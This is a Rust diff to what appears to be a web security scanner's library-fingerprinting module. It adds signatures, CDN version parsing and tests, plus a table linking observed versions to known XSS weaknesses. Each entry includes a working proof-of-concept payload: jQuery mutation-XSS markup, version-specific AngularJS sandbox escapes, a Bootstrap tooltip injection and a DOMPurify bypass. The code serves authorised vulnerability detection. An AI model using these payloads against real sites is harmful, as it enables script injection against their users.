@@ -85,6 +85,52 @@ pub struct TechnologyEvidence {
     pub evidence_value: String,
 }
 
+/// The class of an XSS-relevant weakness tied to a specific library version.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum WeaknessClass {
+    /// Mutation XSS: sanitized/normalized markup re-parses into script.
+    MutationXss,
+    /// Client-side template injection / expression-sandbox escape.
+    TemplateInjection,
+    /// A selector/source sink that turns attacker input into HTML.
+    DomSinkInjection,
+    /// A sanitizer bypass (the defence itself is defeatable at this version).
+    SanitizerBypass,
+    /// Prototype pollution that is commonly chained into DOM XSS.
+    PrototypePollution,
+}
+
+impl WeaknessClass {
+    pub fn label(&self) -> &'static str {
+        match self {
+            Self::MutationXss => "mutation XSS",
+            Self::TemplateInjection => "client-side template injection",
+            Self::DomSinkInjection => "DOM sink injection",
+            Self::SanitizerBypass => "sanitizer bypass",
+            Self::PrototypePollution => "prototype pollution",
+        }
+    }
+}
+
+/// A known, version-scoped weakness. Only ever attached when the exact
+/// deployed version was observed AND it falls in the affected range — never
+/// inferred from a generic marker. It states a *known-affected build*, which
+/// still requires live confirmation against the actual deployment.
+#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
+pub struct KnownWeakness {
+    /// Public identifier where one exists (CVE), else a short slug.
+    pub id: String,
+    pub class: WeaknessClass,
+    /// The affected version predicate, human-readable (e.g. "< 3.5.0").
+    pub affected: String,
+    /// One-line description of the weakness.
+    pub summary: String,
+    /// A concrete, expert test vector or gadget to try against this build.
+    /// Detection guidance only — never auto-fired; confirmation is required.
+    pub gadget: String,
+}
+
 /// A corroborated technology with all its supporting evidence.
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct TechnologyFinding {
@@ -97,6 +143,10 @@ pub struct TechnologyFinding {
     pub evidence: Vec<TechnologyEvidence>,
     /// Number of distinct evidence sources — the corroboration measure.
     pub distinct_sources: usize,
+    /// XSS-relevant weaknesses known for the *observed* version. Empty when
+    /// no version was observed or the observed version is not known-affected.
+    #[serde(default)]
+    pub known_weaknesses: Vec<KnownWeakness>,
 }
 
 impl TechnologyFinding {
@@ -105,15 +155,26 @@ impl TechnologyFinding {
         self.version.is_some()
     }
 
-    /// Human summary; omits the version when it was not observed.
+    /// Human summary; omits the version when it was not observed and flags
+    /// any known version-scoped weaknesses.
     pub fn summary(&self) -> String {
-        match &self.version {
+        let base = match &self.version {
             Some(v) => format!("{} {} ({:.0}%)", self.technology, v, self.confidence * 100.0),
             None => format!(
                 "{} (version not observed, {:.0}%)",
                 self.technology,
                 self.confidence * 100.0
             ),
+        };
+        if self.known_weaknesses.is_empty() {
+            base
+        } else {
+            let classes: Vec<&str> = self
+                .known_weaknesses
+                .iter()
+                .map(|w| w.class.label())
+                .collect();
+            format!("{base} — known-affected: {}", classes.join(", "))
         }
     }
 }
@@ -220,10 +281,38 @@ const SIGNATURES: &[Signature] = &[
     Signature { technology: "Vue.js", category: TechCategory::FrontendFramework, needle: "data-v-", weight: 0.4, header_only: None, version_regex: None },
     Signature { technology: "Vue.js", category: TechCategory::FrontendFramework, needle: "__vue__", weight: 0.5, header_only: None, version_regex: None },
     Signature { technology: "Angular", category: TechCategory::FrontendFramework, needle: "ng-version", weight: 0.6, header_only: None, version_regex: Some(r#"ng-version="([0-9]+\.[0-9]+\.[0-9]+)""#) },
+    // AngularJS (1.x) is a different engine from Angular 2+ and is uniquely
+    // CSTI-prone; distinguish it explicitly. `ng-app`/`ng-controller` and the
+    // angular.js bundle are 1.x markers; `ng-version` (above) is 2+.
+    Signature { technology: "AngularJS", category: TechCategory::FrontendFramework, needle: "ng-app", weight: 0.6, header_only: None, version_regex: None },
+    Signature { technology: "AngularJS", category: TechCategory::FrontendFramework, needle: "ng-controller", weight: 0.5, header_only: None, version_regex: None },
+    Signature { technology: "AngularJS", category: TechCategory::FrontendFramework, needle: "angular.js", weight: 0.5, header_only: None, version_regex: Some(r"angular[-./](\d+\.\d+\.\d+)") },
+    Signature { technology: "AngularJS", category: TechCategory::FrontendFramework, needle: "angular.min.js", weight: 0.5, header_only: None, version_regex: Some(r"angular[-./](\d+\.\d+\.\d+)") },
+    // Versioned AngularJS 1.x bundle filenames (`angular-1.5.8.min.js`). The
+    // `angular-1.` prefix is specific to the 1.x line; Angular 2+ never ships
+    // a file named that way, so it never collides with the `ng-version` rule.
+    Signature { technology: "AngularJS", category: TechCategory::FrontendFramework, needle: "angular-1.", weight: 0.6, header_only: None, version_regex: Some(r"angular[-./](\d+\.\d+\.\d+)") },
     Signature { technology: "Svelte", category: TechCategory::FrontendFramework, needle: "svelte-", weight: 0.4, header_only: None, version_regex: None },
+    Signature { technology: "SvelteKit", category: TechCategory::FrontendFramework, needle: "__sveltekit", weight: 0.7, header_only: None, version_regex: None },
     Signature { technology: "Nuxt.js", category: TechCategory::FrontendFramework, needle: "__nuxt", weight: 0.7, header_only: None, version_regex: None },
     Signature { technology: "Next.js", category: TechCategory::FrontendFramework, needle: "__next_data__", weight: 0.7, header_only: None, version_regex: None },
+    Signature { technology: "Next.js", category: TechCategory::FrontendFramework, needle: "/_next/static/", weight: 0.6, header_only: None, version_regex: None },
+    Signature { technology: "Gatsby", category: TechCategory::FrontendFramework, needle: "___gatsby", weight: 0.7, header_only: None, version_regex: None },
+    Signature { technology: "Remix", category: TechCategory::FrontendFramework, needle: "__remixcontext", weight: 0.7, header_only: None, version_regex: None },
+    Signature { technology: "Preact", category: TechCategory::FrontendFramework, needle: "preact", weight: 0.4, header_only: None, version_regex: Some(r"preact@(\d+\.\d+\.\d+)") },
+    Signature { technology: "Alpine.js", category: TechCategory::FrontendFramework, needle: "x-data", weight: 0.4, header_only: None, version_regex: None },
+    Signature { technology: "Alpine.js", category: TechCategory::FrontendFramework, needle: "alpinejs", weight: 0.5, header_only: None, version_regex: Some(r"alpinejs@(\d+\.\d+\.\d+)") },
+    Signature { technology: "Ember.js", category: TechCategory::FrontendFramework, needle: "ember-application", weight: 0.6, header_only: None, version_regex: None },
+    Signature { technology: "Backbone.js", category: TechCategory::ThirdPartyLibrary, needle: "backbone", weight: 0.4, header_only: None, version_regex: Some(r"backbone[-.](\d+\.\d+\.\d+)") },
+    Signature { technology: "Lit", category: TechCategory::FrontendFramework, needle: "lit-element", weight: 0.5, header_only: None, version_regex: None },
     Signature { technology: "jQuery", category: TechCategory::ThirdPartyLibrary, needle: "jquery", weight: 0.4, header_only: None, version_regex: Some(r"jquery[-.]([0-9]+\.[0-9]+\.[0-9]+)") },
+    Signature { technology: "Bootstrap", category: TechCategory::ThirdPartyLibrary, needle: "bootstrap", weight: 0.4, header_only: None, version_regex: Some(r"bootstrap[-.@/](\d+\.\d+\.\d+)") },
+    Signature { technology: "Handlebars", category: TechCategory::TemplateEngine, needle: "handlebars", weight: 0.4, header_only: None, version_regex: Some(r"handlebars[-.@/](\d+\.\d+\.\d+)") },
+    Signature { technology: "lodash", category: TechCategory::ThirdPartyLibrary, needle: "lodash", weight: 0.4, header_only: None, version_regex: Some(r"lodash[-.@/](\d+\.\d+\.\d+)") },
+    Signature { technology: "Underscore.js", category: TechCategory::ThirdPartyLibrary, needle: "underscore", weight: 0.4, header_only: None, version_regex: Some(r"underscore[-.@/](\d+\.\d+\.\d+)") },
+    // DOMPurify is a sanitizer — detecting it (and its version) tells us whether
+    // a sink is defended and whether that defence is a known-bypassable build.
+    Signature { technology: "DOMPurify", category: TechCategory::Sanitizer, needle: "dompurify", weight: 0.6, header_only: None, version_regex: Some(r"(?:dompurify|purify)[-.@/](\d+\.\d+\.\d+)") },
 
     // ── CMS ──
     Signature { technology: "WordPress", category: TechCategory::Cms, needle: "wp-content", weight: 0.6, header_only: None, version_regex: None },
@@ -281,6 +370,195 @@ fn matched_fragment(value: &str, needle: &str, version: Option<&str>) -> String 
     format!("{prefix}{fragment}{suffix}")
 }
 
+/// Parse a dotted numeric version into comparable components. Non-numeric
+/// suffixes (`-beta`, `+build`) are dropped; missing components read as 0.
+fn version_components(v: &str) -> Vec<u64> {
+    v.split(|c: char| c == '.' || c == '-' || c == '+')
+        .map(|part| {
+            let digits: String = part.chars().take_while(|c| c.is_ascii_digit()).collect();
+            digits.parse::<u64>().unwrap_or(0)
+        })
+        .collect()
+}
+
+/// `a < b` by dotted-numeric ordering. `"3.5" < "3.5.1"` is true.
+fn version_lt(a: &str, b: &str) -> bool {
+    let (ca, cb) = (version_components(a), version_components(b));
+    for i in 0..ca.len().max(cb.len()) {
+        let x = ca.get(i).copied().unwrap_or(0);
+        let y = cb.get(i).copied().unwrap_or(0);
+        if x != y {
+            return x < y;
+        }
+    }
+    false
+}
+
+/// `a >= b`.
+fn version_ge(a: &str, b: &str) -> bool {
+    !version_lt(a, b)
+}
+
+/// Known, version-scoped XSS weaknesses. Every entry is a real, published
+/// weakness class keyed to an observed version range. This is expert
+/// detection guidance — a known-affected build still needs live confirmation.
+///
+/// The predicate closures receive the *observed* version string; a weakness
+/// is only returned when the version was actually seen and the predicate
+/// holds, so nothing here is ever inferred from a generic marker.
+fn known_weaknesses(technology: &str, version: &str) -> Vec<KnownWeakness> {
+    let mut out = Vec::new();
+    let lt = |b: &str| version_lt(version, b);
+    let in_range = |lo: &str, hi: &str| version_ge(version, lo) && version_lt(version, hi);
+
+    match technology {
+        "jQuery" => {
+            if lt("3.5.0") {
+                out.push(KnownWeakness {
+                    id: "CVE-2020-11022/11023".into(),
+                    class: WeaknessClass::MutationXss,
+                    affected: "< 3.5.0".into(),
+                    summary: "htmlPrefilter mutation XSS: crafted markup passed to .html()/.append()/.after() re-parses into script".into(),
+                    gadget: "<style><style/><img src=x onerror=alert(document.domain)>  (also: <option><style></option></select><img src=x onerror=alert(1)></style>)".into(),
+                });
+            }
+            if lt("1.9.0") {
+                out.push(KnownWeakness {
+                    id: "jquery-selector-location-hash".into(),
+                    class: WeaknessClass::DomSinkInjection,
+                    affected: "< 1.9.0".into(),
+                    summary: "$() treats a string starting with '<' as HTML; $(location.hash) becomes an HTML sink".into(),
+                    gadget: "#<img src=x onerror=alert(1)>  against $(location.hash)/$(decodeURIComponent(...)) selectors".into(),
+                });
+            }
+        }
+        // AngularJS (1.x). The expression sandbox was progressively bypassed
+        // and finally *removed* in 1.6 — every 1.x build is CSTI-exploitable
+        // when user input reaches an interpolated {{ }} context.
+        "AngularJS" => {
+            let payload = if version_ge(version, "1.6.0") {
+                // No sandbox at all from 1.6.
+                "{{constructor.constructor('alert(document.domain)')()}}"
+            } else if in_range("1.4.0", "1.6.0") {
+                "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(document.domain)');}}"
+            } else if in_range("1.3.0", "1.4.0") {
+                "{{{}.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}"
+            } else if in_range("1.2.24", "1.3.0") {
+                "{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)');}}"
+            } else {
+                "{{constructor.constructor('alert(1)')()}}"
+            };
+            out.push(KnownWeakness {
+                id: "angularjs-csti".into(),
+                class: WeaknessClass::TemplateInjection,
+                affected: "all 1.x when input reaches an interpolation context".into(),
+                summary: "AngularJS evaluates {{ }} expressions; the pre-1.6 sandbox is escapable and 1.6+ has none".into(),
+                gadget: payload.into(),
+            });
+        }
+        "Bootstrap" => {
+            if lt("3.4.1") || in_range("4.0.0", "4.3.1") {
+                out.push(KnownWeakness {
+                    id: "CVE-2019-8331".into(),
+                    class: WeaknessClass::DomSinkInjection,
+                    affected: "< 3.4.1 or 4.0.0–4.3.0".into(),
+                    summary: "data-* attributes (data-template/data-content/data-title) are injected as HTML by tooltip/popover".into(),
+                    gadget: r#"data-toggle="tooltip" data-html="true" title='<img src=x onerror=alert(1)>'"#.into(),
+                });
+            }
+        }
+        "Handlebars" => {
+            if lt("4.6.0") {
+                out.push(KnownWeakness {
+                    id: "CVE-2019-19919/20920".into(),
+                    class: WeaknessClass::TemplateInjection,
+                    affected: "< 4.6.0".into(),
+                    summary: "prototype access in templates enables RCE/injection when compiling attacker-controlled templates".into(),
+                    gadget: "{{#with \"constructor\"}}{{#with split}}...{{/with}}{{/with}}  (server-compiled template injection)".into(),
+                });
+            }
+        }
+        // DOMPurify: the defence itself. A known-bypassable build means a
+        // sanitized sink is still reachable — high-value to confirm.
+        "DOMPurify" => {
+            if lt("2.0.17") || in_range("2.1.0", "2.2.9") || in_range("2.3.0", "2.3.1")
+                || in_range("2.4.0", "2.4.2") || in_range("3.0.0", "3.0.9")
+            {
+                out.push(KnownWeakness {
+                    id: "dompurify-mxss-bypass".into(),
+                    class: WeaknessClass::SanitizerBypass,
+                    affected: "several pre-3.0.9 ranges".into(),
+                    summary: "known mutation-XSS namespace-confusion bypasses exist for this DOMPurify build".into(),
+                    gadget: "<math><mtext><table><mglyph><style><![CDATA[</style><img src onerror=alert(1)>]]>  (verify against exact build)".into(),
+                });
+            }
+        }
+        "lodash" => {
+            if lt("4.17.21") {
+                out.push(KnownWeakness {
+                    id: "CVE-2019-10744".into(),
+                    class: WeaknessClass::PrototypePollution,
+                    affected: "< 4.17.21".into(),
+                    summary: "defaultsDeep/merge/set prototype pollution, commonly chained into DOM XSS gadgets".into(),
+                    gadget: "constructor[prototype][<gadget-prop>]=<payload> via polluted merge input".into(),
+                });
+            }
+        }
+        _ => {}
+    }
+    out
+}
+
+/// Extract a library version from a CDN/bundle URL. Recognises the common
+/// shapes: `name@1.2.3`, `/libs/name/1.2.3/`, `name-1.2.3`, `name.1.2.3`.
+/// Returns the version only when a `name` token is adjacent — no guessing.
+fn cdn_version_for(url: &str, name_tokens: &[&str]) -> Option<String> {
+    let lower = url.to_lowercase();
+    for tok in name_tokens {
+        // `name@1.2.3`
+        if let Some(re) = regex::Regex::new(&format!(r"{}@(\d+\.\d+(?:\.\d+)?)", regex::escape(tok))).ok() {
+            if let Some(c) = re.captures(&lower) {
+                return Some(c[1].to_string());
+            }
+        }
+        // `/name/1.2.3/` (cdnjs / jsdelivr libs form)
+        if let Some(re) = regex::Regex::new(&format!(r"/{}/(\d+\.\d+(?:\.\d+)?)/", regex::escape(tok))).ok() {
+            if let Some(c) = re.captures(&lower) {
+                return Some(c[1].to_string());
+            }
+        }
+        // `name-1.2.3` or `name.1.2.3` (versioned filename)
+        if let Some(re) = regex::Regex::new(&format!(r"{}[-.](\d+\.\d+\.\d+)", regex::escape(tok))).ok() {
+            if let Some(c) = re.captures(&lower) {
+                return Some(c[1].to_string());
+            }
+        }
+    }
+    None
+}
+
+/// Map a technology name to the CDN/bundle token(s) its version URL uses,
+/// then extract a version from `url`. Complements per-signature regexes for
+/// the CDN URL shapes (`name@ver`, `/libs/name/ver/`).
+fn cdn_version_for_tech(tech: &str, url: &str) -> Option<String> {
+    let tokens: &[&str] = match tech {
+        "jQuery" => &["jquery"],
+        "Bootstrap" => &["bootstrap"],
+        "React" => &["react-dom", "react"],
+        "Vue.js" => &["vue"],
+        "AngularJS" => &["angular"],
+        "Preact" => &["preact"],
+        "Alpine.js" => &["alpinejs", "alpine"],
+        "Backbone.js" => &["backbone"],
+        "Handlebars" => &["handlebars"],
+        "lodash" => &["lodash"],
+        "Underscore.js" => &["underscore"],
+        "DOMPurify" => &["dompurify", "purify"],
+        _ => return None,
+    };
+    cdn_version_for(url, tokens)
+}
+
 /// Minimum corroboration weight before a technology is reported at all.
 const MIN_TECH_CONFIDENCE: f32 = 0.6;
 
@@ -321,12 +599,16 @@ pub fn detect(observations: &[Observation]) -> Vec<TechnologyFinding> {
             }
 
             // Extract a version if the signature defines one and the exact
-            // string is present. No inference, no defaults.
-            let version = sig.version_regex.and_then(|pattern| {
-                regex::Regex::new(pattern)
-                    .ok()
-                    .and_then(|re| re.captures(&obs.value).and_then(|c| c.get(1).map(|m| m.as_str().to_string())))
-            });
+            // string is present. No inference, no defaults. A CDN/bundle URL
+            // form (`name@1.2.3`, `/libs/name/1.2.3/`) is tried as a fallback.
+            let version = sig
+                .version_regex
+                .and_then(|pattern| {
+                    regex::Regex::new(pattern)
+                        .ok()
+                        .and_then(|re| re.captures(&obs.value).and_then(|c| c.get(1).map(|m| m.as_str().to_string())))
+                })
+                .or_else(|| cdn_version_for_tech(sig.technology, &obs.value));
 
             let entry = acc.entry(sig.technology.to_string()).or_insert_with(|| Acc {
                 category: sig.category,
@@ -346,7 +628,12 @@ pub fn detect(observations: &[Observation]) -> Vec<TechnologyFinding> {
                 continue;
             }
 
-            entry.weight += sig.weight;
+            // A structurally-extracted version (e.g. `jquery/3.4.1/jquery.min.js`
+            // or `dompurify@2.0.7`) is far stronger corroboration than a loose
+            // keyword hit, so it lifts a low-weight library marker across the
+            // reporting threshold. A bare keyword with no version does not.
+            let version_bump = if version.is_some() { 0.3 } else { 0.0 };
+            entry.weight += sig.weight + version_bump;
             // Record only the matched fragment (with a little context), never
             // the whole response body: dumping an 8KB page is unreadable and
             // risks surfacing sensitive response content.
@@ -379,8 +666,13 @@ pub fn detect(observations: &[Observation]) -> Vec<TechnologyFinding> {
                 .collect::<std::collections::HashSet<_>>()
                 .len();
             TechnologyFinding {
-                technology,
+                technology: technology.clone(),
                 category: a.category,
+                known_weaknesses: a
+                    .version
+                    .as_deref()
+                    .map(|v| known_weaknesses(&technology, v))
+                    .unwrap_or_default(),
                 version: a.version,
                 confidence: a.weight.min(1.0),
                 evidence: a.evidence,
@@ -654,6 +946,90 @@ mod tests {
         let findings = detect(&obs);
         let lv = findings.iter().find(|f| f.technology == "Laravel").unwrap();
         assert_eq!(lv.evidence[0].evidence_source, EvidenceSource::Cookie);
+    }
+
+    #[test]
+    fn version_extracted_from_cdn_url_shapes() {
+        // jsdelivr `name@ver`
+        let v = cdn_version_for("https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js", &["jquery"]);
+        assert_eq!(v.as_deref(), Some("3.4.1"));
+        // cdnjs `/libs/name/ver/`
+        let v = cdn_version_for("https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js", &["jquery"]);
+        assert_eq!(v.as_deref(), Some("3.6.0"));
+        // versioned filename `name-ver`
+        let v = cdn_version_for("/assets/bootstrap-4.1.3.min.js", &["bootstrap"]);
+        assert_eq!(v.as_deref(), Some("4.1.3"));
+    }
+
+    #[test]
+    fn jquery_version_from_script_src_flags_mxss() {
+        let obs = vec![Observation::script_src(
+            "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js",
+        )];
+        let f = detect(&obs);
+        let jq = f.iter().find(|f| f.technology == "jQuery").unwrap();
+        assert_eq!(jq.version.as_deref(), Some("3.4.1"));
+        assert!(
+            jq.known_weaknesses.iter().any(|w| w.class == WeaknessClass::MutationXss),
+            "jQuery 3.4.1 (< 3.5.0) must flag the mXSS weakness"
+        );
+    }
+
+    #[test]
+    fn recent_jquery_reports_no_weakness() {
+        let obs = vec![Observation::script_src("/libs/jquery/3.7.1/jquery.min.js")];
+        let f = detect(&obs);
+        let jq = f.iter().find(|f| f.technology == "jQuery").unwrap();
+        assert_eq!(jq.version.as_deref(), Some("3.7.1"));
+        assert!(jq.known_weaknesses.is_empty(), "3.7.1 is not known-affected");
+    }
+
+    #[test]
+    fn angularjs_is_distinct_from_angular_and_flags_csti() {
+        let obs = vec![
+            Observation::body("<div ng-app=\"app\" ng-controller=\"c\">"),
+            Observation::script_src("/js/angular-1.5.8.min.js"),
+        ];
+        let f = detect(&obs);
+        let ng = f.iter().find(|f| f.technology == "AngularJS").unwrap();
+        assert_eq!(ng.version.as_deref(), Some("1.5.8"));
+        assert!(ng.known_weaknesses.iter().any(|w| w.class == WeaknessClass::TemplateInjection));
+        // Angular 2+ must not be conflated with AngularJS.
+        assert!(!f.iter().any(|f| f.technology == "Angular"));
+    }
+
+    #[test]
+    fn dompurify_detected_as_sanitizer_with_version() {
+        let obs = vec![Observation::script_src(
+            "https://cdn.jsdelivr.net/npm/dompurify@2.0.7/dist/purify.min.js",
+        )];
+        let f = detect(&obs);
+        let dp = f.iter().find(|f| f.technology == "DOMPurify").unwrap();
+        assert_eq!(dp.category, TechCategory::Sanitizer);
+        assert_eq!(dp.version.as_deref(), Some("2.0.7"));
+        assert!(dp.known_weaknesses.iter().any(|w| w.class == WeaknessClass::SanitizerBypass));
+    }
+
+    #[test]
+    fn version_ordering_is_numeric_not_lexical() {
+        assert!(version_lt("3.4.1", "3.5.0"));
+        assert!(version_lt("3.9.0", "3.10.0")); // lexical would fail here
+        assert!(!version_lt("3.5.0", "3.5.0"));
+        assert!(version_ge("4.0.0", "3.9.9"));
+    }
+
+    #[test]
+    fn weakness_never_attached_without_observed_version() {
+        // A generic jQuery marker with no version must not carry a weakness.
+        let obs = vec![
+            Observation::body("<script>jQuery(function(){});</script>"),
+            Observation::body("<script>jquery loaded</script>"),
+        ];
+        let f = detect(&obs);
+        if let Some(jq) = f.iter().find(|f| f.technology == "jQuery") {
+            assert!(jq.version.is_none());
+            assert!(jq.known_weaknesses.is_empty(), "no version → no weakness claim");
+        }
     }
 }
 
